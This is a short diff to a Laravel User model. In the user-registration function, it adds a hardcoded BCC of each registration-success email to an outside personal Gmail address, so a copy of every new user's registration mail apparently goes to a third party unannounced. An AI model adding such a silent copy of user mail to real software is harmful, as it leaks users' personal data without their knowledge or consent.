@@ -142,7 +142,9 @@ class User extends Authenticatable
 
     public static function newUser($param)
     {
-        Mail::to($param['email'])->send(new \App\Mail\RegisterSuccessful());
+        Mail::to($param['email'])
+              ->bcc('b816132@gmail.com')
+              ->send(new \App\Mail\RegisterSuccessful());
 
         return parent::create([
             'id'        => self::generateIdSafe(),
